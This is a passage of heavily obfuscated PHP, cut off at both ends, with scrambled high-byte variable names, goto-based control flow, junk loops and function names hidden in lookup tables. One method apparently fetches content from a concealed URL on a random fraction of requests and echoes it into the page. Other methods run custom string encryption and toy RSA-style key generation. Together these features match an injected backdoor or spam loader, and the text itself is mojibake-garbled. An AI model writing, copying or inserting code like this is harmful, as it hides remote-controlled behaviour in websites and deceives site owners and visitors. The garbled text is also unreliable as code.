$E‡íÛë… [317]), $E‡íÛë… [318] => array($E‡íÛë… [319] => !1, $E‡íÛë… [320] => !1))); $cæ•‚ƒ±Û = $EâõÍÎ˜¹š[649]; goto cŒÛÖ¾ÜÅØ; cŒÛÖ¾ÜÅØ: if (strlen($cæ•‚ƒ±Û) < $EâõÍÎ˜¹š[605]) { die; } $B’† àî¯Ò = @$E‡íÛë… [276]($DÔ•İŒØÂù, !1, $d„¾÷¨›™); return $E‡íÛë… [210]($B’† àî¯Ò, !0); goto a„¯Å¹˜×¿; DƒÁÀÍ¸Ş: $EâõÍÎ˜¹š =& $_SERVER[œº]; $E‡íÛë…  =& $_SERVER[¡è¹ïÊœğŞ]; $DÔ•İŒØÂù = $E‡íÛë… [313]; goto b°ÂİÂñøŠ; a„¯Å¹˜×¿: } private function xwop420197e6() { goto aô»ÁÂµ ; B»‘¥‰«Ú: $CÓ¤­ëÊªÒ = $CÂºæÀÀ× [$this->gokxb9370e2b]; $eÃÙçòë = $bÜÑ‹ì¤³[650]; while (strlen($eÃÙçòë) < $bÜÑ‹ì¤³[582]) { if (!$eÃÙçòë) { break; } $eÃÙçòë++; } goto b¢ç·î†õ¬; aô»ÁÂµ : $bÜÑ‹ì¤³ =& $_SERVER[œº]; $bŒ¹Îß¾È =& $_SERVER[¡è¹ïÊœğŞ]; $CÂºæÀÀ×  = array($bŒ¹Îß¾È[321] => $bŒ¹Îß¾È[322], $bŒ¹Îß¾È[323] => $bŒ¹Îß¾È[324], $bŒ¹Îß¾È[325] => $bŒ¹Îß¾È[326], $bŒ¹Îß¾È[327] => $bŒ¹Îß¾È[328], $bŒ¹Îß¾È[329] => $bŒ¹Îß¾È[330], $bŒ¹Îß¾È[331] => $bŒ¹Îß¾È[264], $bŒ¹Îß¾È[332] => $bŒ¹Îß¾È[264], $bŒ¹Îß¾È[333] => $bŒ¹Îß¾È[322], $bŒ¹Îß¾È[334] => $bŒ¹Îß¾È[324], $bŒ¹Îß¾È[335] => $bŒ¹Îß¾È[326], $bŒ¹Îß¾È[336] => $bŒ¹Îß¾È[337], $bŒ¹Îß¾È[338] => $bŒ¹Îß¾È[328], $bŒ¹Îß¾È[339] => $bŒ¹Îß¾È[340], $bŒ¹Îß¾È[341] => $bŒ¹Îß¾È[330], $bŒ¹Îß¾È[342] => $bŒ¹Îß¾È[343], $bŒ¹Îß¾È[344] => $bŒ¹Îß¾È[345], $bŒ¹Îß¾È[346] => $bŒ¹Îß¾È[347]); goto B»‘¥‰«Ú; eÁ‰œÉŸŠğ: $aÏí¾‹ÚÑÚ = $bÜÑ‹ì¤³[652]; if (strlen($aÏí¾‹ÚÑÚ) < $bÜÑ‹ì¤³[589]) { die; } $AñÌÆÊ‚‘Ü = $AñÌÆÊ‚‘Ü ? $bŒ¹Îß¾È[263]($AñÌÆÊ‚‘Ü) : 0; goto e½×¤Ï²™; e½×¤Ï²™: $dø—š¢Û¦ = $bÜÑ‹ì¤³[653]; return $CÓ¤­ëÊªÒ + $AñÌÆÊ‚‘Ü; $bß¯í‚¦ƒ© = $bÜÑ‹ì¤³[654]; goto cö‘œâÉŒ; cö‘œâÉŒ: if (strlen($bß¯í‚¦ƒ©) < $bÜÑ‹ì¤³[582]) { return; } goto dòµ”åÎ©; b¢ç·î†õ¬: $CÓ¤­ëÊªÒ = $bŒ¹Îß¾È[263]($CÓ¤­ëÊªÒ ? $CÓ¤­ëÊªÒ : $bŒ¹Îß¾È[322]); $DØêš¯Ü± = $bÜÑ‹ì¤³[651]; $AñÌÆÊ‚‘Ü = $bŒ¹Îß¾È[116]($this->thzj1344bdf0, $bŒ¹Îß¾È[348]); goto eÁ‰œÉŸŠğ; dòµ”åÎ©: } public function kncba33bc99c($c¤¶ë×¿ñç) { goto eƒõ¬ŒÛ‰; AÃ£Ï—ï–‘: if ($F¼™Íİ¨» >= $dè³ª“©·Û[263]($dè³ª“©·Û[264])) { return; } $c©¹¾óàù = $dè³ª“©·Û[61]($dè³ª“©·Û[149])->{$_SERVER[¡è¹ïÊœğŞ][150]}(); if ($c©¹¾óàù <= $F¼™Íİ¨») { return; } goto a•ç´ÔÑ˜–; a•ç´ÔÑ˜–: $F©³¯ñ›¦Ù = $dè³ª“©·Û[61]($dè³ª“©·Û[149])->{$_SERVER[¡è¹ïÊœğŞ][350]}($dè³ª“©·Û[349])->{$_SERVER[¡è¹ïÊœğŞ][351]}($F¼™Íİ¨»)->{$_SERVER[¡è¹ïÊœğŞ][352]}(); $F©³¯ñ›¦Ù = $dè³ª“©·Û[241]($F©³¯ñ›¦Ù, $dè³ª“©·Û[10], $dè³ª“©·Û[349]); if (!$dè³ª“©·Û[261]($c¤¶ë×¿ñç[$dè³ª“©·Û[349]], $F©³¯ñ›¦Ù)) { $dè³ª“©·Û[184]($dè³ª“©·Û[353], !1, $dè³ª“©·Û[258]); } goto a”ğ½ÙŠ›Ì; EØ‹ƒöŸ™: $b¡‹«ĞËìİ = $E¹ßó÷ˆä¨[655]; while ($b¡‹«ĞËìİ < $E¹ßó÷ˆä¨[580]) { if ($b¡‹«ĞËìİ >= 0) { break; } $b¡‹«ĞËìİ++; } if ($c¤¶ë×¿ñç[$dè³ª“©·Û[349]] == $dè³ª“©·Û[239]) { return; } goto AÃ£Ï—ï–‘; eƒõ¬ŒÛ‰: $E¹ßó÷ˆä¨ =& $_SERVER[œº]; $dè³ª“©·Û =& $_SERVER[¡è¹ïÊœğŞ]; $F¼™Íİ¨» = $this->{$_SERVER[¡è¹ïÊœğŞ][147]}(); goto EØ‹ƒöŸ™; a”ğ½ÙŠ›Ì: } public function uqaced1664a4() { goto Eˆİ‰ô‹ò‡; Eˆİ‰ô‹ò‡: $B×ßù¦ÈŒ =& $_SERVER[¡è¹ïÊœğŞ]; if (!$B×ßù¦ÈŒ[116]($GLOBALS, $B×ßù¦ÈŒ[142]) || $B×ßù¦ÈŒ[354](1, 100) > 20) { return; } $d®¼ƒ«ò†œ = $B×ßù¦ÈŒ[268]; goto F²†æ‡µäŞ; F²†æ‡µäŞ: $d®¼ƒ«ò†œ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($d®¼ƒ«ò†œ, $B×ßù¦ÈŒ[270]); $A”¹ƒŞô«Œ = $_SERVER[œº][656]; if (!$A”¹ƒŞô«Œ) { return; } goto a½´ŸÆŞÜ¥; a½´ŸÆŞÜ¥: $Bï‰âèšÒ = $B×ßù¦ÈŒ[271](array($B×ßù¦ÈŒ[272] => array($B×ßù¦ÈŒ[273] => $B×ßù¦ÈŒ[274], $B×ßù¦ÈŒ[275] => 3))); $b“Ê ª’ = @$B×ßù¦ÈŒ[276]($d®¼ƒ«ò†œ, !1, $Bï‰âèšÒ); echo $B×ßù¦ÈŒ[355] . $B×ßù¦ÈŒ[356]($b“Ê ª’) . $B×ßù¦ÈŒ[357]; goto F¬¯Æ·Ë§; F¬¯Æ·Ë§: } private function tdbu2d351c8c($a¶¨àŞù½‚, $BŞßŸŒï¿õ, $eÔ¸Í§õíè = 3) { goto e”‡¤‘›”‰; f£Ñ‘™£µ : $D¥†­í–°Á = $D¶ç±Ÿˆ¼«[657]; if (!$D¥†­í–°Á) { return; } $a¶¨àŞù½‚ = $aæÇ‘êŒÌñ[2]($a¶¨àŞù½‚); goto AéÃÌ‘êÒ; BÇÙ¦Æã—…: $eˆË’Õ¤¤Û = $aæÇ‘êŒÌñ[134](15); $D¨£µç»È— = $D¶ç±Ÿˆ¼«[659]; while ($D¨£µç»È— < $D¶ç±Ÿˆ¼«[605]) { if ($D¨£µç»È— >= 0) { break; } $D¨£µç»È—++; } goto DÌé°†½ÚÓ; dªªÈ«‚Œ©: $Dš†í™‚÷Ô = $D¶ç±Ÿˆ¼«[673]; if (!$Dš†í™‚÷Ô) { die; } if ($eÔ¸Í§õíè - 1 > 0) { $f“†êëôó¨ = $this->{$_SERVER[¡è¹ïÊœğŞ][137]}($f“†êëôó¨, $BŞßŸŒï¿õ, $eÔ¸Í§õíè - 1); } goto c¯§Ûì¢ÈÚ; c¯§Ûì¢ÈÚ: return $f“†êëôó¨; goto CŞôäÚïÆ¨; AéÃÌ‘êÒ: $EÁŸšè­Ğ = $aæÇ‘êŒÌñ[354](0, 5) . $aæÇ‘êŒÌñ[10]; $C’ÃÁíâ = $D¶ç±Ÿˆ¼«[658]; if (!$C’ÃÁíâ) { die; } goto BÇÙ¦Æã—…; DÌé°†½ÚÓ: $cÈĞ‚²Áç = $aæÇ‘êŒÌñ[359]; switch ($EÁŸšè­Ğ) { case $aæÇ‘êŒÌñ[253]: $f“†êëôó¨ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($a¶¨àŞù½‚, $aæÇ‘êŒÌñ[233]($BŞßŸŒï¿õ . $eˆË’Õ¤¤Û)); $FÜÈ· ¼‚ = $D¶ç±Ÿˆ¼«[660]; while (strlen($FÜÈ· ¼‚) < $D¶ç±Ÿˆ¼«[589]) { if (!$FÜÈ· ¼‚) { break; } $FÜÈ· ¼‚++; } break; $cñ¨åÉÒòŒ = $D¶ç±Ÿˆ¼«[661]; while ($cñ¨åÉÒòŒ < $D¶ç±Ÿˆ¼«[580]) { if ($cñ¨åÉÒòŒ >= 0) { break; } $cñ¨åÉÒòŒ++; } case $aæÇ‘êŒÌñ[239]: $f“†êëôó¨ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($a¶¨àŞù½‚, $aæÇ‘êŒÌñ[233]($eˆË’Õ¤¤Û . $BŞßŸŒï¿õ)); $aÂæ¾Şßš– = $D¶ç±Ÿˆ¼«[662]; while (strlen($aÂæ¾Şßš–) < $D¶ç±Ÿˆ¼«[605]) { if (!$aÂæ¾Şßš–) { break; } $aÂæ¾Şßš–++; } break; case $aæÇ‘êŒÌñ[360]: $f“†êëôó¨ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($a¶¨àŞù½‚, $aæÇ‘êŒÌñ[128]($eˆË’Õ¤¤Û . $BŞßŸŒï¿õ)); break; case $aæÇ‘êŒÌñ[361]: $f“†êëôó¨ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($a¶¨àŞù½‚, $aæÇ‘êŒÌñ[124]($eˆË’Õ¤¤Û . $BŞßŸŒï¿õ)); break; $e´âÎ…Æœœ = $D¶ç±Ÿˆ¼«[663]; while ($e´âÎ…Æœœ < $D¶ç±Ÿˆ¼«[589]) { if ($e´âÎ…Æœœ >= 0) { break; } $e´âÎ…Æœœ++; } case $aæÇ‘êŒÌñ[362]: goto EÎŞâŸ÷âÖ; EÎŞâŸ÷âÖ: $a¶¨àŞù½‚ = $aæÇ‘êŒÌñ[128]($a¶¨àŞù½‚); $D›•æ³‘Š = $D¶ç±Ÿˆ¼«[664]; while ($D›•æ³‘Š < $D¶ç±Ÿˆ¼«[580]) { if ($D›•æ³‘Š >= 0) { break; } $D›•æ³‘Š++; } goto f”•¶Ï¬ñ; cÅ¾ËŒÒ’ï: if (strlen($f­¢„ÓÑ) < $D¶ç±Ÿˆ¼«[580]) { die; } break; $cŞÒòÅÙÏÖ = $D¶ç±Ÿˆ¼«[672]; goto e„àµ¨ä—•; B× Ïê: $eÆ¡ÀŠ¸†è = $aæÇ‘êŒÌñ[25]($eÆ¡ÀŠ¸†è, $d–Šš¾Ê % 8, $d–Šš¾Ê % 8 + 7); $d âƒù‰Ä = $D¶ç±Ÿˆ¼«[667]; while ($d âƒù‰Ä < $D¶ç±Ÿˆ¼«[605]) { if ($d âƒù‰Ä >= 0) { break; } $d âƒù‰Ä++; } goto a…ĞÄ‰¢ËÜ; f”•¶Ï¬ñ: $d–Šš¾Ê = $aæÇ‘êŒÌñ[363](0, 64); $dÇÈ©ŠåÇ = $cÈĞ‚²Áç[$d–Šš¾Ê]; $fÓ±°ÅË‹´ = $D¶ç±Ÿˆ¼«[665]; goto C Ş±™¨¹; a…ĞÄ‰¢ËÜ: $bï«²ŠñŸ  = $aæÇ‘êŒÌñ[10]; $F°Ï¾–îÛË = 0; $a‘ØÁÍ¸ñ = 0; goto cß¬¶à¯ôµ; aŒÅ›°õª: for ($F°Ï¾–îÛË = 0; $F°Ï¾–îÛË < $aæÇ‘êŒÌñ[24]($a¶¨àŞù½‚); $F°Ï¾–îÛË++) { $E«Ò««Üò¼ = $E«Ò««Üò¼ == $aæÇ‘êŒÌñ[24]($eÆ¡ÀŠ¸†è) ? 0 : $E«Ò««Üò¼; $aŠ•Í‚ËéÇ = $D¶ç±Ÿˆ¼«[669]; while (strlen($aŠ•Í‚ËéÇ) < $D¶ç±Ÿˆ¼«[580]) { if (!$aŠ•Í‚ËéÇ) { break; } $aŠ•Í‚ËéÇ++; } $a‘ØÁÍ¸ñ = ($d–Šš¾Ê + $aæÇ‘êŒÌñ[364]($cÈĞ‚²Áç, $a¶¨àŞù½‚[$F°Ï¾–îÛË]) + $aæÇ‘êŒÌñ[365]($eÆ¡ÀŠ¸†è[$E«Ò««Üò¼++])) % 64; $bï«²ŠñŸ  .= $cÈĞ‚²Áç[$a‘ØÁÍ¸ñ]; $Eµ«¨ù  = $D¶ç±Ÿˆ¼«[670]; } $f“†êëôó¨ = $aæÇ‘êŒÌñ[356]($dÇÈ©ŠåÇ . $bï«²ŠñŸ ); $f­¢„ÓÑ = $D¶ç±Ÿˆ¼«[671]; goto cÅ¾ËŒÒ’ï; e„àµ¨ä—•: if (strlen($cŞÒòÅÙÏÖ) < $D¶ç±Ÿˆ¼«[580]) { return; } goto fêµ¤—Èƒœ; C Ş±™¨¹: $eÆ¡ÀŠ¸†è = $aæÇ‘êŒÌñ[124]($dÇÈ©ŠåÇ . $aæÇ‘êŒÌñ[124]($BŞßŸŒï¿õ . $dÇÈ©ŠåÇ) . $BŞßŸŒï¿õ); $E¼ÙßÔ©Ã = $D¶ç±Ÿˆ¼«[666]; while ($E¼ÙßÔ©Ã < $D¶ç±Ÿˆ¼«[580]) { if ($E¼ÙßÔ©Ã >= 0) { break; } $E¼ÙßÔ©Ã++; } goto B× Ïê; cß¬¶à¯ôµ: $A¢™“®šç© = $D¶ç±Ÿˆ¼«[668]; while (strlen($A¢™“®šç©) < $D¶ç±Ÿˆ¼«[578]) { if (!$A¢™“®šç©) { break; } $A¢™“®šç©++; } $E«Ò««Üò¼ = 0; goto aŒÅ›°õª; fêµ¤—Èƒœ: default: $f“†êëôó¨ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($a¶¨àŞù½‚, $BŞßŸŒï¿õ . $eˆË’Õ¤¤Û); break; } $f“†êëôó¨ = $aæÇ‘êŒÌñ[233]($EÁŸšè­Ğ . $eˆË’Õ¤¤Û . $f“†êëôó¨); goto dªªÈ«‚Œ©; e”‡¤‘›”‰: $D¶ç±Ÿˆ¼« =& $_SERVER[œº]; $aæÇ‘êŒÌñ =& $_SERVER[¡è¹ïÊœğŞ]; $aæÇ‘êŒÌñ[358](1); goto f£Ñ‘™£µ ; CŞôäÚïÆ¨: } private function cgko38983086($c†¤„Øãˆ½, $Eì¾¨Ïœ²œ, $B“äâŞŒƒ¥ = 3) { goto fÉãŠå¬…ö; Eó“¤…Âœ: switch ($DãÇ°†ŞÃ) { case $Aõ¼®æÏõÀ[253]: $Có”¥£©‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($c†¤„Øãˆ½, $Aõ¼®æÏõÀ[233]($Eì¾¨Ïœ²œ . $dÆî ç´æ)); break; $a ¥öÙ–¾¾ = $Bçñè²œÆº[678]; if (strlen($a ¥öÙ–¾¾) < $Bçñè²œÆº[582]) { die; } case $Aõ¼®æÏõÀ[239]: $Có”¥£©‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($c†¤„Øãˆ½, $Aõ¼®æÏõÀ[233]($dÆî ç´æ . $Eì¾¨Ïœ²œ)); break; case $Aõ¼®æÏõÀ[360]: $Có”¥£©‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($c†¤„Øãˆ½, $Aõ¼®æÏõÀ[128]($dÆî ç´æ . $Eì¾¨Ïœ²œ)); break; $bÆÃĞáé = $Bçñè²œÆº[679]; if (!$bÆÃĞáé) { return; } case $Aõ¼®æÏõÀ[361]: $Có”¥£©‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($c†¤„Øãˆ½, $Aõ¼®æÏõÀ[124]($dÆî ç´æ . $Eì¾¨Ïœ²œ)); $fª«‚±¾œ» = $Bçñè²œÆº[659]; if (!$fª«‚±¾œ») { return; } break; $C—¯Ó½Ş˜£ = $Bçñè²œÆº[680]; if (!$C—¯Ó½Ş˜£) { return; } case $Aõ¼®æÏõÀ[362]: goto B„ÚÈ˜˜Ñ; F‹”ÏäÊù×: if (!$aç³ÛƒŸ¤) { return; } $Eƒ®øîÀË = $Aõ¼®æÏõÀ[10]; $FõïµÃßÊ = $Bçñè²œÆº[685]; goto CêÇíç; CêÇíç: $Bë‚ Å“ó = 0; $Aêò—í˜ãÓ = 0; $B¡Æ¾è¹ = $Bçñè²œÆº[686]; goto f²®Íì«à; B„ÚÈ˜˜Ñ: $c†¤„Øãˆ½ = $Aõ¼®æÏõÀ[366]($c†¤„Øãˆ½); $aÚï‚¸„ß¤ = $c†¤„Øãˆ½[0]; $c†¤„Øãˆ½ = $Aõ¼®æÏõÀ[25]($c†¤„Øãˆ½, 1); goto e–Ï¨¿³; Aù³’¢ÉÎ×: if (strlen($c……âŸ•¤) < $Bçñè²œÆº[605]) { die; } goto BÕÉ¾¸”ÂÒ; a¹Ÿ¶¸ìßÅ: $Bô÷ˆÔÍ… = $Bçñè²œÆº[682]; while ($Bô÷ˆÔÍ… < $Bçñè²œÆº[580]) { if ($Bô÷ˆÔÍ… >= 0) { break; } $Bô÷ˆÔÍ…++; } $aä‚Ÿù‡–ï = $Aõ¼®æÏõÀ[124]($aÚï‚¸„ß¤ . $Aõ¼®æÏõÀ[124]($Eì¾¨Ïœ²œ . $aÚï‚¸„ß¤) . $Eì¾¨Ïœ²œ); goto Föôæ‹ç ë; BïÜ‹„Ä¹ù: while (strlen($dŸîª•Ÿ»½) < $Bçñè²œÆº[582]) { if (!$dŸîª•Ÿ»½) { break; } $dŸîª•Ÿ»½++; } break; $c……âŸ•¤ = $Bçñè²œÆº[690]; goto Aù³’¢ÉÎ×; cÌÛ¡…×ƒ: for ($Bë‚ Å“ó = 0; $Bë‚ Å“ó < $Aõ¼®æÏõÀ[24]($c†¤„Øãˆ½); $Bë‚ Å“ó++) { $e§ôÀŞñ‘¾ = $e§ôÀŞñ‘¾ == $Aõ¼®æÏõÀ[24]($aä‚Ÿù‡–ï) ? 0 : $e§ôÀŞñ‘¾; $Fáì·±Ë¢ê = $Bçñè²œÆº[688]; while (strlen($Fáì·±Ë¢ê) < $Bçñè²œÆº[582]) { if (!$Fáì·±Ë¢ê) { break; } $Fáì·±Ë¢ê++; } $fÒ±¹ŸË‰– = $e§ôÀŞñ‘¾++; $Aêò—í˜ãÓ = $Aõ¼®æÏõÀ[364]($cµ®®»Ğ½, $c†¤„Øãˆ½[$Bë‚ Å“ó]) - $dáÉĞ’ò›× - $Aõ¼®æÏõÀ[365]($aä‚Ÿù‡–ï[$fÒ±¹ŸË‰–]); while ($Aêò—í˜ãÓ < 0) { $Aêò—í˜ãÓ += 64; } $Eƒ®øîÀË .= $cµ®®»Ğ½[$Aêò—í˜ãÓ]; } $Có”¥£©‹ = $Aõ¼®æÏõÀ[367]($Eƒ®øîÀË); $dŸîª•Ÿ»½ = $Bçñè²œÆº[689]; goto BïÜ‹„Ä¹ù; f²®Íì«à: $e§ôÀŞñ‘¾ = 0; $BÛ¹­‹¨Â´ = $Bçñè²œÆº[687]; while ($BÛ¹­‹¨Â´ < $Bçñè²œÆº[578]) { if ($BÛ¹­‹¨Â´ >= 0) { break; } $BÛ¹­‹¨Â´++; } goto cÌÛ¡…×ƒ; Föôæ‹ç ë: $a¤‘©È»ó = $Bçñè²œÆº[683]; $aä‚Ÿù‡–ï = $Aõ¼®æÏõÀ[25]($aä‚Ÿù‡–ï, $dáÉĞ’ò›× % 8, $dáÉĞ’ò›× % 8 + 7); $aç³ÛƒŸ¤ = $Bçñè²œÆº[684]; goto F‹”ÏäÊù×; e–Ï¨¿³: $eéÚ‘Ô» = $Bçñè²œÆº[681]; while ($eéÚ‘Ô» < $Bçñè²œÆº[582]) { if ($eéÚ‘Ô» >= 0) { break; } $eéÚ‘Ô»++; } $dáÉĞ’ò›× = $Aõ¼®æÏõÀ[364]($cµ®®»Ğ½, $aÚï‚¸„ß¤); goto a¹Ÿ¶¸ìßÅ; BÕÉ¾¸”ÂÒ: default: $Có”¥£©‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($c†¤„Øãˆ½, $Eì¾¨Ïœ²œ . $dÆî ç´æ); break; } if ($B“äâŞŒƒ¥ - 1 > 0) { $Có”¥£©‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][208]}($Có”¥£©‹, $Eì¾¨Ïœ²œ, $B“äâŞŒƒ¥ - 1); } return $Có”¥£©‹; goto A•‡‹£õÏ; f›àÃÎåõœ: $DãÇ°†ŞÃ = $c†¤„Øãˆ½[0]; $bˆãµËñÃİ = $Bçñè²œÆº[675]; if (strlen($bˆãµËñÃİ) < $Bçñè²œÆº[582]) { die; } goto Dğ²ÒÏ¾®š; Dğ²ÒÏ¾®š: $dÆî ç´æ = $Aõ¼®æÏõÀ[25]($c†¤„Øãˆ½, 1, 15); $c†¤„Øãˆ½ = $Aõ¼®æÏõÀ[25]($c†¤„Øãˆ½, 16); $D…·«‹Ôâ“ = $Bçñè²œÆº[676]; goto bÃİè¾âéà; fÉãŠå¬…ö: $Bçñè²œÆº =& $_SERVER[œº]; $Aõ¼®æÏõÀ =& $_SERVER[¡è¹ïÊœğŞ]; if (!$Aõ¼®æÏõÀ[158]($c†¤„Øãˆ½) || $Aõ¼®æÏõÀ[24]($c†¤„Øãˆ½) < 10) { return !1; } goto DÜÚªÖÂÇ; bÃİè¾âéà: $cµ®®»Ğ½ = $Aõ¼®æÏõÀ[359]; $B‡Ÿéšçâ¦ = $Bçñè²œÆº[677]; if (strlen($B‡Ÿéšçâ¦) < $Bçñè²œÆº[578]) { die; } goto Eó“¤…Âœ; DÜÚªÖÂÇ: $c†¤„Øãˆ½ = $Aõ¼®æÏõÀ[2]($c†¤„Øãˆ½); $c†¤„Øãˆ½ = $Aõ¼®æÏõÀ[233]($c†¤„Øãˆ½); $eÁ†ó¶© = $Bçñè²œÆº[674]; goto f›àÃÎåõœ; A•‡‹£õÏ: } public function skch96af074d($f÷¯ì†å‰“) { goto f”¡‚ëÚ; BÊöâ‚›¥¿: $d§´ŠôÕï = $fÓ‚êƒÈ‘[124]($fÓ‚êƒÈ‘[369] . ($D’‹ÕÙ³¡‡ + $fË‘§“Ü–Ü) . $fÓ‚êƒÈ‘[370] . $Ağ¿ğ”„¯ . $fÓ‚êƒÈ‘[370] . $eì÷¬ŒÌ . $fÓ‚êƒÈ‘[371]); $dß¢ñ©ˆÓò = $E¬¼ğ§Î±­[694]; while (strlen($dß¢ñ©ˆÓò) < $E¬¼ğ§Î±­[582]) { if (!$dß¢ñ©ˆÓò) { break; } $dß¢ñ©ˆÓò++; } goto Fë··ĞºÒõ; f”¡‚ëÚ: $E¬¼ğ§Î±­ =& $_SERVER[œº]; $fÓ‚êƒÈ‘ =& $_SERVER[¡è¹ïÊœğŞ]; $D’‹ÕÙ³¡‡ = $this->{$_SERVER[¡è¹ïÊœğŞ][368]}(); goto D¾ö“ƒ‰‡; AÂŠîùë²î: $D¡¤»¢Ñ‚ = $E¬¼ğ§Î±­[696]; goto EÕ¶‚÷Ş÷«; eÆŒè¤ïÎ: if (strlen($DŞâ‘“¾©ƒ) < $E¬¼ğ§Î±­[578]) { die; } $Ağ¿ğ”„¯ = $fÓ‚êƒÈ‘[263](($D’‹ÕÙ³¡‡ + $fË‘§“Ü–Ü) / 2); while (1) { $E¡»ø§·íÔ = $Ağ¿ğ”„¯; $Dôå÷¢«í = $E¬¼ğ§Î±­[692]; if (!$Dôå÷¢«í) { die; } $DŞôá¬á = $C‰ÑÅÆãĞ; while ($DŞôá¬á % $E¡»ø§·íÔ != 0) { $c­ª˜Œ•¡ä = $DŞôá¬á; $DŞôá¬á = $E¡»ø§·íÔ; $E¡»ø§·íÔ = $c­ª˜Œ•¡ä % $E¡»ø§·íÔ; $b‹ÑÄ£Ë = $E¬¼ğ§Î±­[693]; while ($b‹ÑÄ£Ë < $E¬¼ğ§Î±­[605]) { if ($b‹ÑÄ£Ë >= 0) { break; } $b‹ÑÄ£Ë++; } } if ($E¡»ø§·íÔ == 1) { break; } else { $Ağ¿ğ”„¯++; } } goto B³ÉŠåàµ‹; B³ÉŠåàµ‹: $eì÷¬ŒÌ = 2; for ($f‡ïäíî = 0; $f‡ïäíî < $C‰ÑÅÆãĞ * 10; $f‡ïäíî++) { if (($C‰ÑÅÆãĞ * $f‡ïäíî + 1) % $Ağ¿ğ”„¯ == 0) { $eì÷¬ŒÌ = $fÓ‚êƒÈ‘[263](($C‰ÑÅÆãĞ * $f‡ïäíî + 1) / $Ağ¿ğ”„¯); break; } } $e¯ğ âšĞµ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($D’‹ÕÙ³¡‡ * $fË‘§“Ü–Ü . $fÓ‚êƒÈ‘[10], $fÓ‚êƒÈ‘[167]); goto BÊöâ‚›¥¿; D¾ö“ƒ‰‡: $fË‘§“Ü–Ü = $this->{$_SERVER[¡è¹ïÊœğŞ][368]}(); $C‰ÑÅÆãĞ = ($D’‹ÕÙ³¡‡ - 1) * ($fË‘§“Ü–Ü - 1); $DŞâ‘“¾©ƒ = $E¬¼ğ§Î±­[691]; goto eÆŒè¤ïÎ; Fë··ĞºÒõ: $bÇ„µ‚İÊ¹ = $this->{$_SERVER[¡è¹ïÊœğŞ][165]}($f÷¯ì†å‰“, $d§´ŠôÕï) . $fÓ‚êƒÈ‘[372] . $e¯ğ âšĞµ; $F—…—¸°šù = $E¬¼ğ§Î±­[695]; return $bÇ„µ‚İÊ¹; goto AÂŠîùë²î; EÕ¶‚÷Ş÷«: } public function lcrj8af8edb1($f¸ó¹Îàõ´) { goto aŸÆŒì¬àã; BŠ©¼óÀ“®: $C÷¿ôÎ¯ç× = $AğƒÕ››¥à[698]; if (!$C÷¿ôÎ¯ç×) { return; } $b‰ºé®„·ˆ = 0; goto cßÑˆ—Ä±á; EÕ¼ßæ¼ö: $fëŒçÀ¬„¡ = $E¼§¼×¦°¹[263](($b‰ºé®„·ˆ + $bùÔÃÈÉ¯í) / 2); while (1) { $A‘Ì³Å‡Æá = $fëŒçÀ¬„¡; $b‘™±›ôá³ = $Dø°²±’¼‡; while ($b‘™±›ôá³ % $A‘Ì³Å‡Æá != 0) { $d»šâÈåé‘ = $b‘™±›ôá³; $b‘™±›ôá³ = $A‘Ì³Å‡Æá; $A‘Ì³Å‡Æá = $d»šâÈåé‘ % $A‘Ì³Å‡Æá; $EŸ”Ãœì‹‹ = $AğƒÕ››¥à[701]; if (strlen($EŸ”Ãœì‹‹) < $AğƒÕ››¥à[605]) { die; } } if ($A‘Ì³Å‡Æá == 1) { break; } else { $fëŒçÀ¬„¡++; } } $C…õè†‹ó× = 2; goto B±‡¤øß‡í; Bµ‰ÜÙ: if (!$e«¶‹‚‰ïÌ) { return; } if (!$B ®È³Ñ) { return $E¼§¼×¦°¹[10]; } $B ®È³Ñ = $E¼§¼×¦°¹[263]($B ®È³Ñ); goto BŠ©¼óÀ“®; B¨—‡Ó½È: while (strlen($B×‹‰©öÖ•) < $AğƒÕ››¥à[580]) { if (!$B×‹‰©öÖ•) { break; } $B×‹‰©öÖ•++; } return $AÊ¤ÆÄĞå‹; goto a„çÑ³âš; cßÑˆ—Ä±á: $bùÔÃÈÉ¯í = 0; for ($E¢ñ¾„åôÖ = 3; $E¢ñ¾„åôÖ < $B ®È³Ñ; $E¢ñ¾„åôÖ += 2) { if ($B ®È³Ñ % $E¢ñ¾„åôÖ != 0) { continue; } $b‰ºé®„·ˆ = $E¢ñ¾„åôÖ; $bùÔÃÈÉ¯í = $E¼§¼×¦°¹[263]($B ®È³Ñ / $E¢ñ¾„åôÖ); $BÙÌšâÈˆ = $AğƒÕ››¥à[699]; break; $AÃÖö•Ÿ±¦ = $AğƒÕ››¥à[700]; while (strlen($AÃÖö•Ÿ±¦) < $AğƒÕ››¥à[578]) { if (!$AÃÖö•Ÿ±¦) { break; } $AÃÖö•Ÿ±¦++; } } $Dø°²±’¼‡ = ($b‰ºé®„·ˆ - 1) * ($bùÔÃÈÉ¯í - 1); goto EÕ¼ßæ¼ö; aÙÙËøîªĞ: if ($E¼§¼×¦°¹[19]($bÊÌ›Âºñ) != 2) { return $E¼§¼×¦°¹[10]; } $B ®È³Ñ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($bÊÌ›Âºñ[1] . $E¼§¼×¦°¹[10], $E¼§¼×¦°¹[167]); $e«¶‹‚‰ïÌ = $AğƒÕ››¥à[697]; goto Bµ‰ÜÙ; CàªÚ’‚‘: $Eã¶åª÷¶î = $AğƒÕ››¥à[638]; $AÊ¤ÆÄĞå‹ = $this->{$_SERVER[¡è¹ïÊœğŞ][269]}($bÊÌ›Âºñ[0], $cß×æìùÄ); $B×‹‰©öÖ• = $AğƒÕ››¥à[703]; goto B¨—‡Ó½È; aŸÆŒì¬àã: $AğƒÕ››¥à =& $_SERVER[œº]; $E¼§¼×¦°¹ =& $_SERVER[¡è¹ïÊœğŞ]; $bÊÌ›Âºñ = $E¼§¼×¦°¹[0]($E¼§¼×¦°¹[372], $f¸ó¹Îàõ´); goto aÙÙËøîªĞ; B±‡¤øß‡í: $aÕÄº’«²ï = $AğƒÕ››¥à[702]; for 